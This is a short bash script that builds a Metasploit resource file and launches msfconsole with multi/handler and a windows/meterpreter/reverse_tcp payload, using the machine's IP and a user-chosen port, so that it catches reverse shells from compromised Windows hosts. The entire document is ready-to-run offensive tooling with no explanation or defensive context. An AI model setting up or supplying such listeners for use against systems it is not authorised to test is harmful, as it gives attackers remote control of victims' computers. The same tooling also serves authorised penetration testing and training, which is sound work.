IP=$(hostname -I)
echo "Enter Your LPORT Number: "
read PORT
echo "IP BEING USED   : $IP"
echo "PORT BEING USED : $PORT"
echo "use multi/handler" > /tmp/handler.rc
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> /tmp/handler.rc
echo "set LHOST $IP" >> /tmp/handler.rc
echo "set LPORT $PORT" >> /tmp/handler.rc
echo "exploit" >> /tmp/handler.rc
service postgresql start
msfconsole -q -r /tmp/handler.rc
